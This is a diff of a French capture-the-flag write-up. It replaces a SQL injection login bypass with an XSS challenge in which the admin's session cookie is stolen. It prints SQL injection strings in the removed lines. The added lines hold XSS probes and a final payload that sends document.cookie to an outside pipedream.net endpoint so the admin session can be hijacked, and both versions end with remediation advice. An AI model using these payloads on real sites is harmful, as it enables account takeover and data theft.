@@ -1,50 +1,63 @@
-# SQL Injection Login Challenge
-https://hackropole.fr/fr/challenges/web/fcsc2021-web-push-it-to-the-limit/
+# Voler le Cookie Admin - XSS Challenge
 
 ## 🎯 Objectif
 
-Se connecter à l'application web en exploitant une vulnérabilité d'injection SQL.
+Se connecter à l'application web en volant le cookie de l'administrateur qui visite les pages via une vulnérabilité XSS.
 
 ## 🔍 Découverte
 
-En inspectant le code source de l'application, on trouve un commentaire HTML révélant la structure de la requête :
-
-```sql
-SELECT * FROM users WHERE username="[INPUT]" AND password="[INPUT]"
+En explorant l'application, nous trouvons une page de recherche avec un paramètre `search` dans l'URL qui semble ne pas être correctement filtré :
+```
+http://localhost:8000/index.php?search=[INPUT]
 ```
 
 ## 💉 Exploitation
 
-### Première tentative
-
-```sql
-" OR "1"="1" --
+### Première tentative - Test XSS basique
+Test de la vulnérabilité avec une simple alerte :
+```javascript
+http://localhost:8000/index.php?search=<script>alert(1)</script>
 ```
+➜ Succès ! L'alerte s'affiche, confirmant la vulnérabilité XSS.
 
-➜ Erreur : "trop de lignes sont retournées par la requête SQL"
-
-### 🛠️ Solution finale
-
-```sql
-" OR "1"="1" LIMIT 1 --
+### Test d'accès aux cookies
+Vérifions l'accès aux cookies :
+```javascript
+http://localhost:8000/index.php?search=<script>alert(document.cookie)</script>
 ```
+➜ Les cookies sont accessibles !
 
-## Comment ça marche ?
+### Solution finale
+1. Création d'un endpoint sur RequestBin pour capturer les cookies :
+   ```
+   https://eoxozs6d4ekomy9.m.pipedream.net/
+   ```
 
-1. `"` ferme le guillemet de la requête
-2. `OR "1"="1"` ajoute une condition toujours vraie
-3. `LIMIT 1` restreint le résultat à une seule ligne
-4. `--` commente le reste de la requête
+2. Construction du payload XSS pour rediriger avec le cookie :
+   ```javascript
+   <img src=x onerror=window.location='https://eoxozs6d4ekomy9.m.pipedream.net/?cookie='+document.cookie>
+   ```
+
+3. URL finale avec le payload (non encodée) :
+   ```
+   http://localhost:8000/index.php?search=<img src=x onerror=window.location='https://eoxozs6d4ekomy9.m.pipedream.net/?cookie='+document.cookie>
+   ```
+
+4. Envoi de l'URL via la page de contact pour que l'administrateur la visite
+5. Récupération du cookie admin dans RequestBin
+6. Remplacement de notre PHPSESSID par celui de l'admin
 
 ## 🎉 Flag
+Flag obtenu après avoir remplacé le cookie par celui de l'administrateur !
 
-Flag obtenu après connexion réussie !
+## 📝 Notes
+- La vulnérabilité XSS est présente car les entrées utilisateur ne sont pas correctement filtrées
+- L'utilisation de RequestBin simplifie grandement la capture des cookies
+- Les cookies de session ne sont pas protégés par le flag HttpOnly
 
-
-## Correction
-
+## 🔒 Correction
 Pour sécuriser ce type de vulnérabilité :
-
-- Utiliser des requêtes préparées
-- Échapper correctement les entrées utilisateur
-- Implémenter une validation côté serveur
+- Echapper correctement toutes les entrées utilisateur
+- Implémenter le flag HttpOnly sur les cookies sensibles
+- Utiliser des en-têtes de sécurité comme Content-Security-Policy
+- Valider et filtrer les paramètres d'entrée côté serveur
